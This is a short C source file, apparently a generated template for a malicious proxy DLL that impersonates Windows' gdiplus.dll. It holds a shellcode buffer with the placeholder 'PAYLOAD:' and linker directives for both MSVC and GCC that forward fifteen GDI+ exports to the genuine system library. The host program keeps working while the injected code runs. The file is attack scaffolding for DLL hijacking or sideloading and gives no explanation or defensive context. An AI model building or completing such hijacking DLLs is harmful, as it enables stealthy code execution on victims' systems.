#define SCSIZE 2048
unsigned char code[SCSIZE] = "PAYLOAD:";

#ifdef _MSC_VER
	#pragma comment (linker, "/export:GdipAlloc=c:/windows/system32/gdiplus.GdipAlloc,@34")
	#pragma comment (linker, "/export:GdipCloneBrush=c:/windows/system32/gdiplus.GdipCloneBrush,@46")
	#pragma comment (linker, "/export:GdipCloneImage=c:/windows/system32/gdiplus.GdipCloneImage,@50")
	#pragma comment (linker, "/export:GdipCreateBitmapFromStream=c:/windows/system32/gdiplus.GdipCreateBitmapFromStream,@74")
	#pragma comment (linker, "/export:GdipCreateFromHDC=c:/windows/system32/gdiplus.GdipCreateFromHDC,@84")
	#pragma comment (linker, "/export:GdipCreateHBITMAPFromBitmap=c:/windows/system32/gdiplus.GdipCreateHBITMAPFromBitmap,@87")
	#pragma comment (linker, "/export:GdipCreateLineBrushI=c:/windows/system32/gdiplus.GdipCreateLineBrushI,@97")
	#pragma comment (linker, "/export:GdipCreateSolidFill=c:/windows/system32/gdiplus.GdipCreateSolidFill,@122")
	#pragma comment (linker, "/export:GdipDeleteBrush=c:/windows/system32/gdiplus.GdipDeleteBrush,@130")
	#pragma comment (linker, "/export:GdipDeleteGraphics=c:/windows/system32/gdiplus.GdipDeleteGraphics,@135")
	#pragma comment (linker, "/export:GdipDisposeImage=c:/windows/system32/gdiplus.GdipDisposeImage,@143")
	#pragma comment (linker, "/export:GdipFillRectangleI=c:/windows/system32/gdiplus.GdipFillRectangleI,@219")
	#pragma comment (linker, "/export:GdipFree=c:/windows/system32/gdiplus.GdipFree,@225")
	#pragma comment (linker, "/export:GdiplusShutdown=c:/windows/system32/gdiplus.GdiplusShutdown,@608")
	#pragma comment (linker, "/export:GdiplusStartup=c:/windows/system32/gdiplus.GdiplusStartup,@609")
#endif
#ifdef __GNUC__
	asm (".section .drectve\n\t.ascii \" -export:GdipAlloc=c:/windows/system32/gdiplus.GdipAlloc @34\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipCloneBrush=c:/windows/system32/gdiplus.GdipCloneBrush @46\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipCloneImage=c:/windows/system32/gdiplus.GdipCloneImage @50\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipCreateBitmapFromStream=c:/windows/system32/gdiplus.GdipCreateBitmapFromStream @74\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipCreateFromHDC=c:/windows/system32/gdiplus.GdipCreateFromHDC @84\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipCreateHBITMAPFromBitmap=c:/windows/system32/gdiplus.GdipCreateHBITMAPFromBitmap @87\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipCreateLineBrushI=c:/windows/system32/gdiplus.GdipCreateLineBrushI @97\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipCreateSolidFill=c:/windows/system32/gdiplus.GdipCreateSolidFill @122\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipDeleteBrush=c:/windows/system32/gdiplus.GdipDeleteBrush @130\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipDeleteGraphics=c:/windows/system32/gdiplus.GdipDeleteGraphics @135\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipDisposeImage=c:/windows/system32/gdiplus.GdipDisposeImage @143\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipFillRectangleI=c:/windows/system32/gdiplus.GdipFillRectangleI @219\"");
	asm (".section .drectve\n\t.ascii \" -export:GdipFree=c:/windows/system32/gdiplus.GdipFree @225\"");
	asm (".section .drectve\n\t.ascii \" -export:GdiplusShutdown=c:/windows/system32/gdiplus.GdiplusShutdown @608\"");
	asm (".section .drectve\n\t.ascii \" -export:GdiplusStartup=c:/windows/system32/gdiplus.GdiplusStartup @609\"");
#endif



